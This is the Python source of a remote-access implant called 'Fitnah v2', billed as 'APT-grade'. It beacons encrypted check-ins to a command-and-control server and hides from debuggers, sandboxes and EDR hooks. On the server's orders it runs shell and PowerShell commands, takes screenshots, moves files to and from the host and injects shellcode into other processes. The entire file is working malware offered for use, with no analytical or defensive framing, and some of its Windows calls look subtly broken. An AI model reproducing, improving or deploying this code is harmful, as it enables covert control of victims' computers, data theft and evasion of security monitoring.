"""Fitnah v2 — Advanced HTTP implant with modern evasion techniques.

APT-grade implant with anti-analysis, sandbox detection, and advanced evasion.
Beacons to C2 over HTTPS/HTTP with traffic randomization and OPSEC hardening.

Usage:
    python agent.py --c2 https://<C2_IP>:8888 --key fitnah-secret-key-change-me
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import platform
import random
import socket
import subprocess
import sys
import time
import uuid
import hashlib
import ctypes
import ctypes.wintypes as wt
from typing import Optional, Dict, Any

from fitnah.implant.core.beacon     import Beacon
from fitnah.implant.core.task_queue import TaskQueue
from fitnah.implant.core.crypto     import ImplantCrypto
from fitnah.implant.commands.exec   import ExecHandler
from fitnah.implant.commands.ps     import PsHandler
from fitnah.implant.commands.info   import InfoHandler
from fitnah.implant.commands.screenshot import ScreenshotHandler
from fitnah.implant.commands.download   import DownloadHandler
from fitnah.implant.commands.upload     import UploadHandler


class AdvancedEvasion:
    """Advanced anti-analysis and evasion techniques for hostile environments."""
    
    def __init__(self):
        self._k32 = ctypes.windll.kernel32
        self._ntdll = ctypes.windll.ntdll
        self._user32 = ctypes.windll.user32 if hasattr(ctypes.windll, 'user32') else None
        
    def check_debugger(self) -> bool:
        """Check for debugger presence using multiple techniques."""
        try:
            # 1. Check PEB BeingDebugged flag
            peb = self._ntdll.NtCurrentPeb()
            if peb.BeingDebugged:
                return True
            
            # 2. Check ProcessDebugPort
            debug_port = ctypes.c_ulong()
            size = ctypes.sizeof(debug_port)
            self._ntdll.NtQueryInformationProcess(
                self._k32.GetCurrentProcess(),
                7,  # ProcessDebugPort
                ctypes.byref(debug_port),
                size,
                None
            )
            if debug_port.value != 0:
                return True
            
            # 3. Check NtGlobalFlag
            global_flag = ctypes.c_ulong()
            self._ntdll.NtQueryInformationProcess(
                self._k32.GetCurrentProcess(),
                0x22,  # ProcessDebugFlags
                ctypes.byref(global_flag),
                size,
                None
            )
            if global_flag.value == 0:
                return True
            
            # 4. Check hardware breakpoints
            context = wt.CONTEXT()
            context.ContextFlags = 0x10010  # CONTEXT_DEBUG_REGISTERS
            if self._k32.GetThreadContext(self._k32.GetCurrentThread(), ctypes.byref(context)):
                if any([context.Dr0, context.Dr1, context.Dr2, context.Dr3]):
                    return True
            
            return False
        except:
            return False
    
    def check_sandbox(self) -> bool:
        """Check for sandbox/virtualized environment."""
        try:
            # 1. Check RAM size
            mem_status = wt.MEMORYSTATUSEX()
            mem_status.dwLength = ctypes.sizeof(mem_status)
            self._k32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
            ram_gb = mem_status.ullTotalPhys / (1024**3)
            
            # 2. Check CPU cores
            import multiprocessing
            cpu_cores = multiprocessing.cpu_count()
            
            # 3. Check uptime (sandboxes often have short uptime)
            uptime_ms = self._k32.GetTickCount()
            uptime_hours = uptime_ms / (1000 * 60 * 60)
            
            # 4. Check common sandbox artifacts
            sandbox_paths = [
                "C:\\analysis",
                "C:\\sandbox",
                "C:\\malware",
                "C:\\sample",
                "C:\\virus",
            ]
            
            for path in sandbox_paths:
                if os.path.exists(path):
                    return True
            
            # Detection thresholds
            if ram_gb < 2.0:  # Less than 2GB RAM
                return True
            if cpu_cores < 2:  # Single core
                return True
            if uptime_hours < 2:  # Less than 2 hours uptime
                return True
            
            return False
        except:
            return False
    
    def check_hooking(self) -> bool:
        """Check for API hooking (AV/EDR)."""
        try:
            # Check NtCreateThread in ntdll.dll
            ntdll = self._k32.GetModuleHandleW("ntdll.dll")
            if not ntdll:
                ntdll = self._k32.LoadLibraryW("ntdll.dll")
            
            nt_create_thread = self._k32.GetProcAddress(ntdll, "NtCreateThread")
            if not nt_create_thread:
                return False
            
            # Read first few bytes
            buffer = (ctypes.c_byte * 8)()
            bytes_read = ctypes.c_size_t(0)
            self._k32.ReadProcessMemory(
                self._k32.GetCurrentProcess(),
                nt_create_thread,
                buffer,
                8,
                ctypes.byref(bytes_read)
            )
            
            # Check for jmp instruction (0xE9) or push/ret (common hook patterns)
            first_byte = buffer[0]
            return first_byte == 0xE9 or first_byte == 0x68  # jmp or push
        except:
            return False
    
    def generate_fingerprint(self) -> str:
        """Generate unique system fingerprint for C2 identification."""
        try:
            # Collect system information
            hostname = socket.gethostname()
            mac = self._get_mac_address()
            volume_serial = self._get_volume_serial()
            
            # Create fingerprint hash
            fingerprint_data = f"{hostname}:{mac}:{volume_serial}"
            return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]
        except:
            return hashlib.sha256(str(random.random()).encode()).hexdigest()[:16]
    
    def _get_mac_address(self) -> str:
        """Get MAC address for fingerprinting."""
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:00:00:00:00:00"
    
    def _get_volume_serial(self) -> str:
        """Get volume serial number for fingerprinting."""
        try:
            if sys.platform == "win32":
                volume_name = ctypes.create_unicode_buffer(261)
                volume_serial = ctypes.c_ulong()
                max_component_len = ctypes.c_ulong()
                file_system_flags = ctypes.c_ulong()
                file_system_name = ctypes.create_unicode_buffer(261)
                
                self._k32.GetVolumeInformationW(
                    "C:\\",
                    volume_name,
                    ctypes.sizeof(volume_name),
                    ctypes.byref(volume_serial),
                    ctypes.byref(max_component_len),
                    ctypes.byref(file_system_flags),
                    file_system_name,
                    ctypes.sizeof(file_system_name)
                )
                
                return hex(volume_serial.value)[2:].upper()
        except:
            return "00000000"
        
        return "00000000"
    
    def sleep_jitter(self, base_sleep: int, jitter_percent: int) -> int:
        """Calculate sleep time with random jitter for evasion."""
        jitter = random.randint(-jitter_percent, jitter_percent)
        jitter_factor = 1 + (jitter / 100.0)
        return max(1, int(base_sleep * jitter_factor))
    
    def random_user_agent(self) -> str:
        """Generate random user agent for traffic diversification."""
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        ]
        return random.choice(browsers)


def _ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "unknown"


def _priv() -> str:
    try:
        return "system" if os.getuid() == 0 else "user"
    except AttributeError:
        try:
            import ctypes
            return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
        except Exception:
            return "user"


class ImplantAgent:
    def __init__(self, c2_url: str, auth_key: str, sleep: int = 15, jitter: int = 20,
                 max_sleep: int = 300, profile=None, enable_evasion: bool = True):
        self.c2_url    = c2_url.rstrip("/")
        self.auth_key  = auth_key
        self.agent_id  = uuid.uuid4().hex[:8]
        self.beacon    = Beacon(sleep=sleep, jitter=jitter, max_sleep=max_sleep)
        self.queue     = TaskQueue()
        self.crypto    = ImplantCrypto(secret=auth_key)
        self._session  = None
        self._profile  = profile
        self.enable_evasion = enable_evasion
        
        # Advanced evasion module
        self.evasion = AdvancedEvasion() if enable_evasion else None
        
        # Generate persistent fingerprint
        self.fingerprint = self.evasion.generate_fingerprint() if enable_evasion else self.agent_id
        
        # Command handlers
        self.exec_h    = ExecHandler()
        self.ps_h      = PsHandler()
        self.info_h    = InfoHandler()
        self.ss_h      = ScreenshotHandler()
        self.dl_h      = DownloadHandler()
        self.ul_h      = UploadHandler()
        
        # Perform initial security checks
        if enable_evasion:
            self._security_checks()
    
    def _security_checks(self) -> None:
        """Perform security checks and exit if hostile environment detected."""
        if not self.enable_evasion or not self.evasion:
            return
        
        try:
            # Check for debugger
            if self.evasion.check_debugger():
                print("[!] Debugger detected - exiting", flush=True)
                sys.exit(0)
            
            # Check for sandbox
            if self.evasion.check_sandbox():
                print("[!] Sandbox detected - exiting", flush=True)
                sys.exit(0)
            
            # Check for API hooking
            if self.evasion.check_hooking():
                print("[!] API hooking detected - continuing with caution", flush=True)
                # Don't exit, but log the detection
        except Exception as e:
            print(f"[!] Security check error: {e}", flush=True)

    def _http(self):
        if self._session is None:
            try:
                import requests
                s = requests.Session()
                
                # Base headers
                headers = {
                    "Content-Type": "application/octet-stream",
                    "X-Agent-Key":  self.auth_key,
                    "X-Agent-Id":   self.agent_id,
                    "X-Fingerprint": self.fingerprint,
                }
                
                # Add random user agent if evasion enabled
                if self.enable_evasion and self.evasion:
                    headers["User-Agent"] = self.evasion.random_user_agent()
                
                s.headers.update(headers)
                
                # Configure session for better evasion
                s.verify = False  # Disable SSL verification (for testing)
                s.timeout = 10
                
                self._session = s
            except ImportError:
                print("[!] pip install requests", flush=True)
                sys.exit(1)
        return self._session

    def _encrypt_body(self, payload: dict) -> bytes:
        """JSON-serialize and AES-256-GCM encrypt a payload dict."""
        raw = json.dumps(payload).encode()
        encrypted = self.crypto.encrypt(raw)
        return base64.b64encode(encrypted)

    def _profile_wrap(self, body: bytes) -> bytes:
        """Apply profile body_prepend/append if a profile is configured."""
        if self._profile is None:
            return body
        return self._profile.body_prepend + body + self._profile.body_append

    def _profile_headers(self) -> dict:
        """Return extra headers from the active profile."""
        if self._profile is None:
            return {}
        h = dict(self._profile.headers)
        if self._profile.user_agent:
            h["User-Agent"] = self._profile.user_agent
        return h

    def _decrypt_response(self, r) -> dict:
        """Decrypt an encrypted server response. Falls back to plain JSON if not encrypted."""
        if r.headers.get("X-Encrypted") == "1":
            try:
                raw = r.content
                # strip profile framing if active
                if self._profile:
                    pre, post = self._profile.body_prepend, self._profile.body_append
                    if pre and raw.startswith(pre):
                        raw = raw[len(pre):]
                    if post and raw.endswith(post):
                        raw = raw[:-len(post)]
                decoded   = base64.b64decode(raw)
                plaintext = self.crypto.decrypt(decoded)
                return json.loads(plaintext)
            except Exception as exc:
                print(f"[!] response decrypt failed: {exc}", flush=True)
                return {}
        # plain JSON fallback (backwards compat / non-encrypted server)
        try:
            return r.json()
        except Exception:
            return {}

    def _checkin_payload(self) -> dict:
        info = self.info_h.collect()
        
        # Base payload
        payload = {
            "type":       "CHECKIN",
            "agent_id":   self.agent_id,
            "fingerprint": self.fingerprint,
            "hostname":   info.get("hostname", socket.gethostname()),
            "os":         info.get("os", platform.platform()),
            "arch":       info.get("arch", platform.machine()),
            "username":   info.get("username", "unknown"),
            "domain":     info.get("domain", ""),
            "ip":         _ip(),
            "priv_level": _priv(),
            "pid":        info.get("pid", os.getpid()),
            "is_admin":   info.get("is_admin", False),
            "ps_version": info.get("ps_version", ""),
            "av":         info.get("av_detected", []),
            "evasion_enabled": self.enable_evasion,
        }
        
        # Add evasion detection information if enabled
        if self.enable_evasion and self.evasion:
            try:
                payload["debugger_detected"] = self.evasion.check_debugger()
                payload["sandbox_detected"] = self.evasion.check_sandbox()
                payload["hooking_detected"] = self.evasion.check_hooking()
                
                # Add system information for fingerprint verification
                import multiprocessing
                mem_status = wt.MEMORYSTATUSEX()
                mem_status.dwLength = ctypes.sizeof(mem_status)
                self._k32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
                
                payload["system_info"] = {
                    "cpu_cores": multiprocessing.cpu_count(),
                    "ram_gb": mem_status.ullTotalPhys / (1024**3),
                    "uptime_hours": self._k32.GetTickCount() / (1000 * 60 * 60),
                }
            except Exception as e:
                payload["evasion_error"] = str(e)
        
        return payload

    def _handle_task(self, task: dict, checkin: dict) -> str:
        command = task.get("command", "")
        args    = task.get("args", {})

        if command in ("shell", "exec"):
            r = self.exec_h.run(
                cmd     = args.get("cmd", ""),
                timeout = int(args.get("timeout", 30)),
                shell   = True,
            )
            return r["output"]

        elif command == "powershell":
            r = self.ps_h.run(
                cmd     = args.get("cmd", ""),
                timeout = int(args.get("timeout", 60)),
                encode  = args.get("encode", False),
            )
            return r["output"]

        elif command == "sysinfo":
            info = self.info_h.collect()
            return json.dumps(info, indent=2)

        elif command == "screenshot":
            import base64
            png = self.ss_h.capture()
            if isinstance(png, bytes):
                return base64.b64encode(png).decode()
            return f"[error] screenshot: {png}"

        elif command == "download":
            path   = args.get("path", "")
            offset = int(args.get("offset", 0))
            length = int(args.get("length", 4 * 1024 * 1024))
            r = self.dl_h.read_chunk(path, offset=offset, length=length)
            return json.dumps(r)

        elif command == "upload":
            r = self.ul_h.write(
                path    = args.get("path", ""),
                data_b64= args.get("data", ""),
                append  = args.get("append", False),
                mkdir   = args.get("mkdir", True),
            )
            return json.dumps(r)

        elif command == "die":
            self._ack(self._http(), task.get("id", ""), "terminating")
            sys.exit(0)

        elif command == "ping":
            return "pong"

        elif command == "sleep":
            self.beacon.sleep = int(args.get("seconds", self.beacon.sleep))
            self.beacon.jitter = int(args.get("jitter", self.beacon.jitter))
            return f"sleep={self.beacon.sleep}s jitter={self.beacon.jitter}%"

        elif command == "checkin":
            return json.dumps(checkin)
        
        elif command == "evasion_status":
            # Return current evasion status
            status = {
                "enabled": self.enable_evasion,
                "fingerprint": self.fingerprint,
            }
            if self.enable_evasion and self.evasion:
                status.update({
                    "debugger": self.evasion.check_debugger(),
                    "sandbox": self.evasion.check_sandbox(),
                    "hooking": self.evasion.check_hooking(),
                })
            return json.dumps(status, indent=2)
        
        elif command == "shellcode_inject":
            # Advanced shellcode injection command
            from fitnah.implant.loader.shellcode import ShellcodeLoader
            loader = ShellcodeLoader()
            
            method = args.get("method", "thread")
            shellcode_b64 = args.get("shellcode", "")
            
            if not shellcode_b64:
                return "[error] No shellcode provided"
            
            try:
                shellcode = base64.b64decode(shellcode_b64)
                
                if args.get("pid"):
                    pid = int(args.get("pid"))
                    success = loader.inject_remote(pid, shellcode, method=method)
                    return f"[{'success' if success else 'failed'}] Remote injection via {method} into PID {pid}"
                else:
                    success = loader.inject_self(shellcode, method=method)
                    return f"[{'success' if success else 'failed'}] Self injection via {method}"
            except Exception as e:
                return f"[error] Injection failed: {e}"

        else:
            # fallback — attempt as raw shell
            if command:
                r = self.exec_h.run(cmd=command, timeout=30, shell=True)
                return r["output"]
            return f"[agent] unknown command: {command!r}"

    def _ack(self, http, task_id: str, output: str, status: str = "ok") -> None:
        try:
            payload = {"id": task_id, "status": status, "output": output}
            body = self._profile_wrap(self._encrypt_body(payload))
            extra_headers = self._profile_headers()
            extra_headers["X-Encrypted"] = "1"
            ack_uri = self._profile.ack_uri if self._profile else "/ack"
            if self._profile and self._profile.uri_params:
                ack_uri += "?" + "&".join(self._profile.uri_params)
            http.post(
                self.c2_url + ack_uri,
                data=body,
                headers=extra_headers,
                timeout=10,
            )
        except Exception as exc:
            print(f"[!] ack failed: {exc}", flush=True)

    def run(self) -> None:
        http    = self._http()
        checkin = self._checkin_payload()
        print(f"[*] agent_id={self.agent_id}  c2={self.c2_url}", flush=True)

        consecutive_failures = 0

        # Build checkin URL with optional profile URI params
        checkin_uri = (self._profile.checkin_uri if self._profile else "/checkin")
        if self._profile and self._profile.uri_params:
            checkin_uri += "?" + "&".join(self._profile.uri_params)

        extra_headers = self._profile_headers()
        extra_headers["X-Encrypted"] = "1"

        while True:
            try:
                body = self._profile_wrap(self._encrypt_body(checkin))
                r = http.post(
                    self.c2_url + checkin_uri,
                    data=body,
                    headers=extra_headers,
                    timeout=10,
                )
                if r.status_code == 200:
                    consecutive_failures = 0
                    self.beacon.mark_success()
                    # Server always responds encrypted — decrypt before parsing
                    resp_tasks = self._decrypt_response(r)
                    for task in resp_tasks.get("tasks", []):
                        task_id = task.get("id", "")
                        try:
                            output = self._handle_task(task, checkin)
                        except Exception as exc:
                            output = f"[error] {exc}"
                        self._ack(http, task_id, output)
                else:
                    print(f"[!] HTTP {r.status_code}", flush=True)
                    consecutive_failures += 1
                    self.beacon.mark_failure()
            except Exception as exc:
                print(f"[!] {exc}", flush=True)
                consecutive_failures += 1
                self.beacon.mark_failure()

            time.sleep(self.beacon.next_sleep())


def run(c2_url: str, auth_key: str, interval: float = 15.0) -> None:
    """Legacy entry point for compatibility."""
    agent = ImplantAgent(c2_url=c2_url, auth_key=auth_key, sleep=int(interval))
    agent.run()


def main() -> None:
    p = argparse.ArgumentParser(description="Fitnah v2 Advanced Implant")
    p.add_argument("--c2",       required=True, help="C2 server URL")
    p.add_argument("--key",      required=True, help="Authentication key")
    p.add_argument("--interval", default=15,   type=int,   help="Base sleep (seconds)")
    p.add_argument("--jitter",   default=20,   type=int,   help="Jitter percent")
    p.add_argument("--max-sleep",default=300,  type=int,   help="Max backoff sleep")
    p.add_argument("--no-evasion", action="store_true", help="Disable advanced evasion features")
    p.add_argument("--profile",   default=None, help="Profile name for traffic shaping")
    args = p.parse_args()
    
    agent = ImplantAgent(
        c2_url   = args.c2.rstrip("/"),
        auth_key = args.key,
        sleep    = args.interval,
        jitter   = args.jitter,
        max_sleep= args.max_sleep,
        profile  = args.profile,
        enable_evasion = not args.no_evasion,
    )
    agent.run()


if __name__ == "__main__":
    main()
